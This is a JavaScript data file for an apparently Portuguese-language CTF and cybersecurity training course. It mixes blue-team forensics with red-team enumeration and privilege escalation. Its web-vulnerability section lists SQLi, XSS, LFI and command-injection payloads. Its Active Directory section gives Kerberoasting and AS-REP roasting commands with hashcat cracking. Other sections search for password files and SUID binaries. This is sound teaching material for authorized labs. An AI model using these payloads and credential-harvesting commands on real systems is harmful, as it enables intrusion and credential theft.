        { type: 'output', text: '-rw-r--r--  1 0  0  1024 Jan 01 backup.zip' },
        { type: 'output', text: '-rw-r--r--  1 0  0   512 Jan 01 notes.txt' },
        { type: 'prompt', text: 'get backup.zip' },
        { type: 'output', text: '226 Transfer complete.' },
        { type: 'prompt', text: 'bye' },
      ],
      tips: ['FTP anônimo (anonymous/anything@) é encontrado com frequência em CTFs. Verifique sempre. Credenciais FTP em texto claro aparecem em PCAP — use filtro "ftp" no Wireshark.']
    }
  },
  {
    id: 'd1-smb-commands', title: 'SMB — Enumeração', day: 1, topic: 'Redes',
    type: 'commands',
    content: {
      theory: ['SMB (Server Message Block): porta 445. Compartilhamento de arquivos e impressoras Windows. SMBv1 tem EternalBlue (MS17-010). Sessão nula = acesso anônimo.'],
      commands: [
        'smbclient -L //10.10.10.10 -N          # listar shares, sem senha',
        'smbclient //10.10.10.10/share -N        # conectar anonimamente',
        'smbclient //10.10.10.10/share -U user   # com usuário',
        'enum4linux -a 10.10.10.10              # enumeração completa',
        'crackmapexec smb 10.10.10.10           # info rápida',
        'crackmapexec smb 10.10.10.10 -u user -p pass --shares',
        'crackmapexec smb 10.10.10.10 -u user -p pass --users',
      ],
      tips: ['Sempre tente acesso anônimo primeiro (-N). Muitos CTFs têm shares acessíveis sem credenciais com dados valiosos.']
    }
  },
  {
    id: 'd1-nmap-theory', title: 'Nmap — Fundamentos', day: 1, topic: 'Ferramentas',
    type: 'theory',
    content: {
      theory: [
        'Nmap: scanner de rede. SEMPRE o primeiro passo em qualquer CTF. Identifica portas abertas, serviços e versões.',
        'Tipos de scan: -sS (SYN/stealth — padrão, requer root), -sT (TCP connect), -sU (UDP), -sV (versão), -sC (scripts padrão).',
        'Timing: -T0 (mais lento/furtivo) a -T5 (mais rápido/barulhento). Padrão: -T3. Em CTF: use -T4.',
        'Output: -oN (normal), -oX (XML), -oG (grepable), -oA (todos). SEMPRE salve o output.',
        'Scripts NSE: --script=vuln (vulnerabilidades), --script=safe (não-destrutivos), scripts individuais por nome.',
      ],
      tips: [
        'Comando padrão para CTF: nmap -sC -sV -oN scan.txt 10.10.10.10',
        'Para todas as portas: nmap -p- --min-rate 5000 -oN allports.txt 10.10.10.10',
        'Sempre adicione -Pn se o host parece offline (firewall bloqueando ping)',
        'Analise cada porta aberta: serviço, versão, scripts. Não assuma — confirme.',
      ]
    }
  },
  {
    id: 'd1-nmap-terminal', title: 'Nmap — Terminal Realista', day: 1, topic: 'Ferramentas',
    type: 'terminal',
    content: {
      terminal: [
        { type: 'prompt', text: 'nmap -sC -sV -oN scan.txt 10.10.10.10' },
        { type: 'output', text: 'Starting Nmap 7.94 ( https://nmap.org )' },
        { type: 'output', text: 'Nmap scan report for 10.10.10.10' },
        { type: 'output', text: 'Host is up (0.023s latency).' },
        { type: 'output', text: '' },
        { type: 'output', text: 'PORT   STATE SERVICE VERSION' },
        { type: 'output', text: '22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu' },
        { type: 'output', text: '80/tcp open  http    Apache httpd 2.4.41' },
        { type: 'output', text: '|_http-title: Security Dashboard' },
        { type: 'output', text: '' },
        { type: 'output', text: 'Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds' },
        { type: 'comment', text: '# Erro comum: host parece offline' },
        { type: 'error', text: 'Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn' },
        { type: 'comment', text: '# Solução: adicionar -Pn' },
        { type: 'prompt', text: 'nmap -Pn -sC -sV -oN scan.txt 10.10.10.10' },
      ],
    }
  },
  {
    id: 'd1-linux-filesystem', title: 'Linux — Estrutura do Sistema', day: 1, topic: 'Linux',
    type: 'theory',
    content: {
      theory: [
        '/         — raiz do sistema de arquivos',
        '/etc      — arquivos de configuração (/etc/passwd, /etc/shadow, /etc/hosts, /etc/crontab)',
        '/home     — diretórios dos usuários',
        '/var      — dados variáveis: logs em /var/log/, spool em /var/spool/',
        '/tmp      — gravável por todos — alvo comum de ataques e uploads',
        '/proc     — sistema de arquivos virtual: info de processos (/proc/version, /proc/net/tcp)',
        '/opt      — software opcional instalado manualmente',
        '/usr/local/bin — binários instalados pelo usuário',
      ],
      commands: [
        'ls -la                                  # listar com ocultos',
        'cat /etc/passwd                         # usuários do sistema',
        'cat /etc/crontab                        # tarefas agendadas',
        'find / -perm -4000 2>/dev/null          # binários SUID',
        'find / -writable -type f 2>/dev/null    # arquivos graváveis',
        'history                                 # histórico de comandos',
        'whoami; id                              # usuário atual',
        'uname -a                                # info do kernel',
        'ps aux                                  # processos em execução',
        'netstat -tulpn                          # portas abertas',
      ]
    }
  },
  {
    id: 'd1-linux-permissions', title: 'Linux — Permissões e SUID', day: 1, topic: 'Linux',
    type: 'theory',
    content: {
      theory: [
        'Formato: -rwxr-xr-- = tipo / dono / grupo / outros',
        'Numérico: r=4, w=2, x=1. Somar: rwx=7, rw=6, rx=5, r=4.',
        '755 = rwxr-xr-x (padrão diretórios), 644 = rw-r--r-- (padrão arquivos).',
        'SUID (4000): executa com as permissões do dono do arquivo. Se dono=root e SUID ativo = roda como root.',
        'SGID (2000): executa com permissões do grupo do arquivo.',
        'Sticky bit (1000): somente o dono pode deletar (usado em /tmp).',
        'SUID é o vetor de escalada de privilégio mais comum em CTFs Linux.',
      ],
      commands: [
        'find / -perm -4000 -type f 2>/dev/null  # todos os binários SUID',
        'chmod 755 arquivo',
        'chmod +x script.sh',
        'chmod 4755 /usr/bin/python3             # setar SUID (requer root)',
        'ls -la /usr/bin/python3',
        'getcap -r / 2>/dev/null                 # buscar capabilities',
      ],
      tips: [
        'Após obter shell: execute imediatamente find / -perm -4000 2>/dev/null',
        'Consulte GTFOBins (gtfobins.github.io) para explorar qualquer binário SUID',
        'Capabilities (cap_setuid+ep) são equivalentes ao SUID mas mais granulares',
      ]
    }
  },
  {
    id: 'd1-linux-logs', title: 'Linux — Logs do Sistema', day: 1, topic: 'Linux',
    type: 'commands',
    content: {
      theory: ['Logs Linux são fundamentais para forense e investigação de incidentes. Saber onde procurar e como filtrar economiza tempo em CTFs.'],
      commands: [
        'tail -f /var/log/auth.log                   # autenticação em tempo real',
        'grep "Failed password" /var/log/auth.log    # falhas de login',
        'grep "Accepted" /var/log/auth.log           # logins bem-sucedidos',
        'cat /var/log/syslog | grep -i error         # erros gerais',
        'journalctl -u ssh                           # logs do serviço SSH',
        'journalctl --since "2024-01-01 00:00"       # por data',
        'last                                        # histórico de logins',
        'lastlog                                     # último login por usuário',
        'cat ~/.bash_history                         # histórico do bash',
        'cat /proc/version                           # versão do kernel/OS',
      ]
    }
  },
  {
    id: 'd1-windows-eventids', title: 'Windows — Event IDs Essenciais', day: 1, topic: 'Windows',
    type: 'table',
    content: {
      table: {
        headers: ['Event ID', 'Canal', 'Descrição'],
        rows: [
          ['4624', 'Security', 'Logon bem-sucedido'],
          ['4625', 'Security', 'Falha de logon'],
          ['4634', 'Security', 'Logoff'],
          ['4648', 'Security', 'Logon com credenciais explícitas (RunAs)'],
          ['4672', 'Security', 'Privilégios especiais atribuídos (logon de admin)'],
          ['4688', 'Security', 'Novo processo criado'],
          ['4697', 'Security', 'Serviço instalado no sistema'],
          ['4720', 'Security', 'Conta de usuário criada'],
          ['4722', 'Security', 'Conta de usuário ativada'],
          ['4728', 'Security', 'Usuário adicionado a grupo global'],
          ['4732', 'Security', 'Usuário adicionado a grupo local'],
          ['1102', 'Security', 'Log de auditoria limpo — CRÍTICO'],
        ]
      },
      tips: [
        '4625 em sequência rápida = indicador de brute force',
        '4688 mostra cadeia de processos — identifique processos pai suspeitos',
        '1102 = atacante limpando rastros. Investigue tudo antes deste evento.',
        '4672 logo após 4624 = admin logado. Correlacione com IP de origem.',
      ]
    }
  },
  {
    id: 'd1-wireshark', title: 'Wireshark — Filtros Essenciais', day: 1, topic: 'Forense',
    type: 'commands',
    content: {
      theory: ['Wireshark analisa arquivos .pcap e .pcapng. Follow TCP Stream reconstrói conversas completas. Export HTTP Objects extrai arquivos transferidos.'],
      commands: [
        'http                                        # todo tráfego HTTP',
        'http.request.method == "POST"              # somente POST',
        'http contains "password"                   # buscar string no HTTP',
        'dns                                        # queries DNS',
        'ftp                                        # comandos FTP',
        'ftp-data                                   # dados transferidos por FTP',
        'smb                                        # tráfego SMB',
        'ip.addr == 10.10.10.10                    # por IP',
        'tcp.port == 80                             # por porta',
        'tcp.stream eq 5                            # stream TCP específico',
      ],
      tips: [
        'Statistics → Protocol Hierarchy: visão geral dos protocolos no PCAP',
        'Follow → TCP Stream: reconstruir conversa completa',
        'File → Export Objects → HTTP: extrair arquivos transferidos',
        'FTP e Telnet transmitem credenciais em texto claro — sempre filtre',
      ]
    }
  },
  {
    id: 'd1-web-vulns', title: 'Web — Vulnerabilidades Comuns', day: 1, topic: 'Web',
    type: 'theory',
    content: {
      theory: [
        'SQL Injection: injeção de código SQL em queries. Payloads: \' OR \'1\'=\'1, admin\'--',
        'XSS: injeção de JavaScript no HTML. Payload: <script>alert(document.cookie)</script>',
        'LFI (Local File Inclusion): incluir arquivos locais via parâmetro. Payload: ?page=../../../../etc/passwd',
        'Command Injection: executar comandos OS via parâmetro. Payloads: ; ls, | whoami, && id',
        'IDOR (Insecure Direct Object Reference): alterar ID para acessar dados de outros usuários. Ex: ?id=1 → ?id=2',
        'Directory Traversal: acessar arquivos fora do diretório web. Payload: ../../../etc/passwd',
        'Upload inseguro: enviar arquivo com extensão maliciosa (.php, .aspx) quando apenas imagens são permitidas',
      ],
      commands: [
        'gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt',
        'ffuf -u http://target.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt',
        'curl "http://target.htb/page?id=1\'"     # teste básico de SQLi',
        "curl 'http://target.htb/page?file=../../../../etc/passwd'   # LFI",
        'curl "http://target.htb/page?id=1 or 1=1" # comparar resposta no lab',
      ]
    }
  },
  {
    id: 'd1-labs', title: 'Laboratórios — Dia 1 (Easy)', day: 1, topic: 'Labs',
    type: 'lab',
    content: {
      note: 'Todas as máquinas abaixo são do Hack The Box em ambiente autorizado. Conecte-se via VPN HTB antes de iniciar. Documente cada passo como se fosse um relatório real.'
    }
  },

  // ==================== DAY 2 ====================
  {
    id: 'd2-wazuh-theory', title: 'Wazuh — SIEM e XDR', day: 2, topic: 'Blue Team',
    type: 'theory',
    content: {
      theory: [
        'SIEM (Security Information and Event Management): coleta, normaliza e correlaciona eventos de segurança de múltiplas fontes.',
        'XDR (Extended Detection and Response): correlação entre endpoint, rede e nuvem em uma única plataforma.',
        'Wazuh Manager: servidor central que processa logs e gera alertas.',
        'Wazuh Agent: instalado nos endpoints (Windows/Linux). Coleta logs locais, FIM, SCA e envia ao Manager.',
        'Decoder: analisa o formato do log bruto e extrai campos estruturados (srcip, dstuser, action).',
        'Rule: define condições para gerar um alerta. Cada rule tem ID único e level de severidade (0-15).',
        'Alert level: 0-3 informativo, 4-6 baixo, 7-11 médio, 12-15 crítico. Level 7+ normalmente aparece no dashboard.',
        'FIM (File Integrity Monitoring): detecta criação, modificação e deleção de arquivos monitorados.',
        'SCA (Security Configuration Assessment): verifica conformidade com benchmarks de hardening.',
      ]
    }
  },
  {
    id: 'd2-wazuh-investigation', title: 'Wazuh — Investigando um Alerta', day: 2, topic: 'Blue Team',
    type: 'theory',
    content: {
      theory: [
        'Passo 1: Identifique o Rule ID e Level. Level 12+ = alta prioridade.',
        'Passo 2: Leia a descrição da rule. O que ela detecta exatamente?',
        'Passo 3: Analise os campos decodificados: srcip (IP origem), dstip (IP destino), user (usuário), file (arquivo), process (processo).',
        'Passo 4: Correlacione com outros alertas do mesmo srcip/user/host no mesmo intervalo de tempo.',
        'Passo 5: Mapeie para MITRE ATT&CK. Qual técnica descreve este comportamento?',
        'Passo 6: Determine se é falso positivo ou incidente real. Colete evidências.',
      ],
      tips: [
        'Filtre por srcip para ver todos os alertas de um mesmo IP — padrão revela intenção',
        'Correlacione timestamps: múltiplos alertas em segundos = automação/ferramenta',
        'FIM + login suspeito no mesmo host = comprometimento confirmado',
        'Wazuh mostra o log original — leia o raw log, não apenas o alerta processado',
      ]
    }
  },
  {
    id: 'd2-windows-logs', title: 'Windows — PowerShell e Event Viewer', day: 2, topic: 'Windows',
    type: 'commands',
    content: {
      theory: ['Consultas PowerShell para Event Viewer são fundamentais em blue team. Mais eficientes do que interface gráfica para filtrar grandes volumes de logs.'],
      commands: [
        '# Filtrar por Event ID',
        'Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]" | Select -First 20',
        '',
        '# Múltiplos Event IDs',
        'Get-WinEvent -LogName Security | Where-Object {$_.Id -in @(4624,4625,4648)} | Format-List',
        '',
        '# Ler arquivo .evtx exportado',
        'Get-WinEvent -Path "C:\\log.evtx" -FilterXPath "*[System[EventID=1]]"',
        '',
        '# Sysmon — criação de processo',
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1]]"',
        '',
        '# Buscar por usuário específico',
        'Get-WinEvent -LogName Security | Where-Object {$_.Message -like "*Administrator*"}',
      ]
    }
  },
  {
    id: 'd2-sysmon', title: 'Sysmon — Event IDs', day: 2, topic: 'Windows',
    type: 'table',
    content: {
      table: {
        headers: ['Event ID', 'Evento Sysmon'],
        rows: [
          ['1', 'Criação de processo — command line completa, hash, pai'],
          ['2', 'Alteração de timestamp de arquivo'],
          ['3', 'Conexão de rede — IP/porta de origem e destino'],
          ['7', 'DLL carregada no processo'],
          ['10', 'Acesso a processo (OpenProcess)'],
          ['11', 'Arquivo criado'],
          ['12', 'Registro criado/deletado'],
          ['13', 'Registro modificado (valor set)'],
          ['15', 'Arquivo criado com stream alternativo (ADS)'],
          ['22', 'Query DNS'],
          ['23', 'Arquivo deletado (com hash)'],
        ]
      },
      tips: [
        'Sysmon Event 1 é o mais valioso: mostra processo pai + filho + command line + hash',
        'Sysmon Event 3 revela conexões de rede de processos — identifica beaconing C2',
        'Sysmon Event 7 (DLL) junto com Event 10 (OpenProcess) pode indicar injeção de código',
      ]
    }
  },
  {
    id: 'd2-ad-theory', title: 'Active Directory — Conceitos', day: 2, topic: 'Active Directory',
    type: 'theory',
    content: {
      theory: [
        'Domain: agrupamento lógico de computadores e usuários gerenciados centralmente por um Domain Controller (DC).',
        'Domain Controller: servidor executando AD DS. Autentica usuários, aplica políticas, armazena diretório.',
        'Usuários e Grupos: Domain Admins (admins locais ao domínio), Enterprise Admins (toda a floresta), Schema Admins.',
        'Kerberos: protocolo de autenticação padrão do AD. Baseado em tickets. TGT (Ticket Granting Ticket), TGS (Service Ticket). Porta 88.',
        'LDAP: protocolo de consulta ao diretório. Porta 389 (LDAP), 636 (LDAPS). Usado por ferramentas de enumeração.',
        'NTLM: protocolo legado de autenticação baseado em hash. Challenge-Response. Mais fraco que Kerberos.',
        'SPNs (Service Principal Names): identificam serviços Kerberos. Associados a contas de serviço — alvo de Kerberoasting.',
      ]
    }
  },
  {
    id: 'd2-ad-attacks', title: 'Active Directory — Ataques Comuns', day: 2, topic: 'Active Directory',
    type: 'theory',
    content: {
      theory: [
        'AS-REP Roasting: contas com "não requer pré-autenticação Kerberos" — qualquer um pode solicitar o hash TGT sem senha.',
        'Kerberoasting: solicitar tickets de serviço para contas com SPN. O ticket é criptografado com a senha da conta de serviço — quebrável offline.',
        'Pass-the-Hash: usar o hash NTLM diretamente para autenticar, sem precisar da senha em texto claro.',
        'DCSync: simular um DC pedindo replicação ao DC real — extrai todos os hashes do domínio.',
        'BloodHound: mapeia relações no AD e encontra caminhos de ataque até Domain Admin.',
      ],
      commands: [
        '# AS-REP Roasting',
        'GetNPUsers.py target.htb/ -usersfile users.txt -no-pass -outputfile asrep.txt',
        '',
        '# Kerberoasting',
        'GetUserSPNs.py target.htb/user:pass -request -outputfile kerb.txt',
        '',
        '# BloodHound coleta',
        'bloodhound-python -d target.htb -u user -p pass -ns 10.10.10.10 -c All',
        '',
        '# Crack de hash',
        'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt  # AS-REP',
        'hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # Kerberoast',
      ]
    }
  },
  {
    id: 'd2-disk-forensics', title: 'Forense de Disco — Fundamentos', day: 2, topic: 'Forense',
    type: 'theory',
    content: {
      theory: [
        'Imagem forense: cópia bit-a-bit do disco. Formatos: .dd (raw), .E01 (EnCase, com metadados).',
        'Hash: MD5/SHA256 da imagem = cadeia de custódia. Sempre verifique antes e depois de trabalhar.',
        'NUNCA trabalhe na evidência original — sempre em uma cópia. Preservação é crítica.',
        'Timestamps MACB: Modified (conteúdo), Accessed (leitura), Changed ($MFT), Born (criação).',
        'Timeline: ordenar eventos por timestamp para reconstruir o que aconteceu e quando.',
      ],
      commands: [
        'sha256sum imagem.dd > hash_original.txt    # gerar hash',
        'sha256sum imagem.dd                        # verificar integridade',
        'mmls imagem.dd                             # tabela de partições',
        'fls -r imagem.dd                           # listar arquivos',
        'icat imagem.dd 12345                       # extrair por inode',
        'autopsy                                    # interface gráfica',
      ]
    }
  },
  {
    id: 'd2-windows-artifacts', title: 'Artefatos Windows — Referência', day: 2, topic: 'Forense',
    type: 'table',
    content: {
      table: {
        headers: ['Artefato', 'Localização', 'O que revela'],
        rows: [
          ['$MFT', 'Raiz NTFS', 'Todos os arquivos: nome, tamanho, timestamps, localização'],
          ['$Recycle.Bin', 'C:\\$Recycle.Bin\\', 'Arquivos deletados com nome original e timestamp'],
          ['Prefetch', 'C:\\Windows\\Prefetch\\', 'Evidência de execução de programa (até 128 apps)'],
          ['AmCache', 'C:\\Windows\\AppCompat\\Programs\\Amcache.hve', 'Execução de programa + SHA1 do binário'],
          ['ShimCache', 'SYSTEM hive → SYSTEM\\CurrentControlSet\\Control\\SessionManager\\AppCompatCache', 'Histórico de execução de programas'],
          ['LNK files', 'C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\', 'Arquivos abertos recentemente + timestamps'],
          ['Jump Lists', 'C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\', 'Arquivos abertos por aplicação'],
          ['Registry hives', 'C:\\Windows\\System32\\config\\', 'SAM (hashes locais), SYSTEM, SOFTWARE'],
          ['NTUSER.DAT', 'C:\\Users\\user\\', 'Configurações do usuário, histórico do Explorer'],
          ['Browser History', 'AppData\\Local\\Google\\Chrome\\User Data\\Default\\', 'URLs visitadas, downloads'],
        ]
      },
      tips: ['Prefetch prova execução mesmo se o arquivo foi deletado. AmCache tem o SHA1 — consulte no VirusTotal se suspeito.']
    }
  },
  {
    id: 'd2-linux-artifacts', title: 'Artefatos Linux — Referência', day: 2, topic: 'Forense',
    type: 'table',
    content: {
      table: {
        headers: ['Artefato', 'Localização', 'O que revela'],
        rows: [
          ['/etc/passwd', '/etc/passwd', 'Usuários do sistema, shells, UIDs'],
          ['/etc/shadow', '/etc/shadow', 'Hashes de senhas'],
          ['bash_history', '~/.bash_history', 'Comandos executados pelo usuário'],
          ['auth.log', '/var/log/auth.log', 'Logins SSH, sudo, falhas de autenticação'],
          ['syslog', '/var/log/syslog', 'Eventos gerais do sistema'],
          ['cron', '/etc/crontab, /etc/cron.*', 'Tarefas agendadas — persistência comum'],
          ['authorized_keys', '~/.ssh/authorized_keys', 'Chaves SSH autorizadas — backdoor persistente'],
          ['/tmp', '/tmp', 'Arquivos temporários, uploads de atacantes'],
          ['/proc', '/proc/[PID]/', 'Processos em execução: cmdline, net/tcp'],
          ['wtmp/btmp', '/var/log/wtmp, /var/log/btmp', 'Histórico de logins bem-sucedidos/falhos'],
        ]
      }
    }
  },
  {
    id: 'd2-pcap-intermediate', title: 'PCAP — Análise Intermediária', day: 2, topic: 'Forense',
    type: 'commands',
    content: {
      theory: ['Análise avançada de PCAP: extrair credenciais, reconstruir sessões, identificar C2.'],
      commands: [
        '# Filtros avançados',
        'http.request.method == "POST" && http contains "password"',
        'ftp-data                                   # dados transferidos por FTP',
        'smtp                                       # tráfego de e-mail',
        'http.response.code == 200                  # respostas bem-sucedidas',
        '',
        '# Workflow de análise',
        '1. Statistics → Protocol Hierarchy (visão geral)',
        '2. Filtrar protocolo suspeito',
        '3. Follow → TCP Stream (reconstruir sessão)',
        '4. File → Export Objects → HTTP (extrair arquivos)',
        '5. Verificar credenciais em texto claro: FTP, Telnet, HTTP Basic Auth',
      ],
      tips: [
        'SMTP pode conter credenciais Base64 encoded — decodifique com: echo "base64" | base64 -d',
        'HTTP Basic Auth: "Authorization: Basic" + base64(user:senha)',
        'FTP command channel (porta 21): USER e PASS em texto claro',
        'Procure por data exfiltration: grandes transferências para IPs externos',
      ]
    }
  },
  {
    id: 'd2-labs', title: 'Laboratórios — Dia 2 (Medium)', day: 2, topic: 'Labs',
    type: 'lab',
    content: {
      note: 'Máquinas medium exigem encadeamento de vulnerabilidades. Não existe um único exploit — é uma série de passos. Documente cada etapa.'
    }
  },

  // ==================== DAY 3 ====================
  {
    id: 'd3-memory-theory', title: 'Forense de Memória — Fundamentos', day: 3, topic: 'Forense',
    type: 'theory',
    content: {
      theory: [
        'RAM contém evidências que nunca aparecem em disco: processos, conexões, chaves de criptografia, malware injetado.',
        'Formatos de dump: .raw (dump bruto), .mem, .vmem (VMware), .dmp (crash dump Windows).',
        'Aquisição: ferramenta dedicada no sistema alvo (WinPmem, DumpIt, LiME para Linux). Nunca copie sem ferramenta específica.',
        'Volatility 3: framework Python de análise de memória. Baseado em plugins por OS (windows.*, linux.*, mac.*).',
        'Identificar perfil: Volatility 3 detecta automaticamente o OS da memória.',
      ],
      commands: [
        'python3 vol.py -f memory.raw windows.info        # info do sistema',
        'python3 vol.py -f memory.raw windows.pslist      # lista de processos',
        'python3 vol.py -f memory.raw windows.pstree      # árvore de processos',
        'python3 vol.py -f memory.raw windows.cmdline     # linha de comando',
        'python3 vol.py -f memory.raw windows.netscan     # conexões de rede',
        'python3 vol.py -f memory.raw windows.dlllist     # DLLs carregadas',
        'python3 vol.py -f memory.raw windows.malfind     # regiões suspeitas',
        'python3 vol.py -f memory.raw windows.filescan    # arquivos abertos',
        'python3 vol.py -f memory.raw windows.hashdump    # hashes de senha',
        'python3 vol.py -f memory.raw windows.dumpfiles --physaddr 0x... # extrair arquivo',
      ]
    }
  },
  {
    id: 'd3-memory-malware', title: 'Volatility — Identificando Malware', day: 3, topic: 'Forense',
    type: 'terminal',
    content: {
      terminal: [
        { type: 'prompt', text: 'python3 vol.py -f memory.raw windows.pstree' },
        { type: 'output', text: 'PID  PPID  ImageFileName     Offset   Threads' },
        { type: 'output', text: '4    0     System            0x804d...  140' },
        { type: 'output', text: '672  4     smss.exe          0x821a...    3' },
        { type: 'output', text: '756  672   csrss.exe         0x81f2...   10' },
        { type: 'output', text: '836  672   winlogon.exe      0x820d...   19' },
        { type: 'output', text: '1748 1500  WINWORD.EXE       0x89ab...   12' },
        { type: 'output', text: '2156 1748  cmd.exe           0x8a3f...    1   <-- SUSPEITO' },
        { type: 'output', text: '2200 2156  powershell.exe    0x8b12...    4   <-- SUSPEITO' },
        { type: 'comment', text: '# Word gerando cmd.exe → powershell = macro maliciosa' },
        { type: 'prompt', text: 'python3 vol.py -f memory.raw windows.cmdline --pid 2200' },
        { type: 'output', text: 'PID 2200: powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMA...' },
        { type: 'comment', text: '# Base64 encoded — decodifique: echo "JABj..." | base64 -d' },
      ],
      tips: [
        'malfind detecta memória com permissão RWX e header PE (MZ) — indica código injetado',
        'Processo sem pai visível ou com parent PID incorreto = suspeito',
        'netscan com Office/Word/Explorer fazendo conexões externas = comprometimento',
      ]
    }
  },
  {
    id: 'd3-malware-static', title: 'Malware — Análise Estática', day: 3, topic: 'Malware',
    type: 'commands',
    content: {
      theory: ['Análise estática: examinar o binário sem executar. Seguro, rápido. Ponto de partida obrigatório.'],
      commands: [
        'file malware.exe                        # tipo de arquivo',
        'strings malware.exe                     # strings ASCII',
        'strings -e l malware.exe               # strings Unicode (Windows)',
        'md5sum malware.exe; sha256sum malware.exe  # hashes',
        'objdump -d malware.exe                  # disassembly',
        'readelf -h malware.elf                  # ELF headers (Linux)',
        'xxd malware.exe | head -20              # hex dump',
      ],
      tips: [
        'Strings suspeitas: URLs (http://), IPs, cmd.exe, powershell.exe, regsvr32.exe',
        'Chaves de registry Run: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = persistência',
        'Strings em Base64 longa = payload codificado',
        'Assinaturas de packer: "UPX" → use upx -d para desempacotar',
      ]
    }
  },
  {
    id: 'd3-mitre-framework', title: 'MITRE ATT&CK — Framework', day: 3, topic: 'MITRE',
    type: 'theory',
    content: {
      theory: [
        'MITRE ATT&CK: base de conhecimento de táticas e técnicas de adversários reais. Padrão da indústria.',
        'Táticas (o PORQUÊ): Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.',
        'Técnicas (o COMO): identificadas por T-number. Ex: T1059.001 = PowerShell.',
        'Sub-técnicas: detalham implementações específicas de uma técnica.',
        'Uso em CTF: ao encontrar uma técnica, identifique a tática correspondente e documente o T-number no relatório.',
      ],
      table: {
        headers: ['Evidência', 'Técnica MITRE'],
        rows: [
          ['net user hacker /add', 'T1136.001 — Create Local Account'],
          ['Word.exe → cmd.exe (Event 4688)', 'T1055 — Process Injection'],
          ['Scheduled Task (Event 4698)', 'T1053.005 — Scheduled Task/Job'],
          ['LSASS memory access', 'T1003.001 — OS Credential Dumping: LSASS'],
          ['Regsvr32 executando DLL', 'T1218.010 — Regsvr32'],
          ['PowerShell encoded command', 'T1059.001 — PowerShell'],
          ['nmap', 'T1046 — Network Service Discovery'],
          ['Chave Run no Registry', 'T1547.001 — Registry Run Keys'],
        ]
      }
    }
  },
  {
    id: 'd3-privesc-linux', title: 'Privilege Escalation Linux — Metodologia', day: 3, topic: 'Red Team',
    type: 'commands',
    content: {
      theory: ['Escalada de privilégios Linux: mover de usuário limitado para root. Metodologia sistemática — nunca pule etapas.'],
      commands: [
        '# 1. Informações do sistema',
        'uname -a; cat /etc/os-release; cat /proc/version',
        '',
        '# 2. Usuário atual',
        'whoami; id; sudo -l',
        '',
        '# 3. SUID e capabilities',
        'find / -perm -4000 -type f 2>/dev/null',
        'getcap -r / 2>/dev/null',
        '',
        '# 4. Cron jobs',
        'cat /etc/crontab; ls -la /etc/cron.*; crontab -l',
        '',
        '# 5. Serviços rodando como root',
        'ps aux | grep root',
        '',
        '# 6. PATH e arquivos graváveis',
        'echo $PATH',
        'find / -writable -type f 2>/dev/null | grep -v proc',
        '',
        '# 7. Senhas em arquivos de configuração',
        'grep -r "password" /etc/ 2>/dev/null',
        'find / -name "*.conf" -exec grep -l "pass" {} \\; 2>/dev/null',
      ],
      tips: [
        'GTFOBins (gtfobins.github.io): referência para explorar qualquer binário SUID',
        'sudo -l: se mostra NOPASSWD, explore imediatamente via GTFOBins',
        'Cron com script gravável = escrita de payload + aguardar execução agendada',
      ]
    }
  },
  {
    id: 'd3-privesc-windows', title: 'Privilege Escalation Windows — Metodologia', day: 3, topic: 'Red Team',
    type: 'commands',
    content: {
      theory: ['Escalada Windows: tokens, serviços mal configurados, AlwaysInstallElevated, DLL hijacking.'],
      commands: [
        '# 1. Informações do usuário',
        'whoami /priv',
        'whoami /groups',
        '',
        '# 2. Sistema',
        'systeminfo',
        'wmic qfe get Caption,Description,HotFixID  # patches instalados',
        '',
        '# 3. Serviços com caminho não-aspado',
        'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"',
        '',
        '# 4. Permissões de serviço',
        'accesschk.exe -uwcqv "Everyone" * /accepteula',
        'accesschk.exe -uwcqv "Users" * /accepteula',
        '',
        '# 5. AlwaysInstallElevated',
        'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
        'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
      ],
      tips: [
        'SeImpersonatePrivilege → JuicyPotato (2019) ou PrintSpoofer (2020) para SYSTEM',
        'LOLBAS (lolbas-project.github.io): binários Windows nativos para privesc/bypass',
        'Unquoted service path: se "C:\\Program Files\\App\\service.exe" → crie "C:\\Program.exe"',
      ]
    }
  },
  {
    id: 'd3-labs', title: 'Laboratórios — Dia 3 (Hard)', day: 3, topic: 'Labs',
    type: 'lab',
    content: {
      note: 'Máquinas difíceis exigem encadeamento complexo de técnicas. Espere gastar 2-4 horas em cada na primeira vez. Pesquise ativamente — não fique travado por mais de 20 minutos sem tentar uma abordagem diferente.'
    }
  },

  // ==================== DAY 4 ====================
  {
    id: 'd4-checklist', title: 'Checklist de Análise de Incidente', day: 4, topic: 'Revisão',
    type: 'checklist',
    content: {
      checklist: [
        'Qual IP atacou?',
        'Qual máquina foi comprometida?',
        'Qual usuário foi usado?',
        'Qual porta foi explorada?',
        'Qual processo suspeito rodou?',
        'Qual arquivo foi criado ou modificado?',
        'Qual comando foi executado?',
        'Qual horário do ataque?',
        'Qual persistência foi criada?',
        'Qual log comprova isso?',
        'Qual Event ID comprova isso?',
        'Qual alerta do Wazuh comprova isso?',
        'Qual técnica MITRE se encaixa?',
        'Qual artefato de disco confirma?',
        'Qual artefato de memória confirma?',
      ]
    }
  },
  {
    id: 'd4-cheatsheet', title: 'Cheat Sheet — Comandos Essenciais', day: 4, topic: 'Revisão',
    type: 'cheatsheet',
    content: {
      commands: [
        '# ========== RECONHECIMENTO ==========',
        'nmap -sC -sV -oN scan.txt <IP>',
        'nmap -p- --min-rate 5000 -oN allports.txt <IP>',
        'nmap -Pn -sC -sV <IP>         # quando host parece offline',
        '',
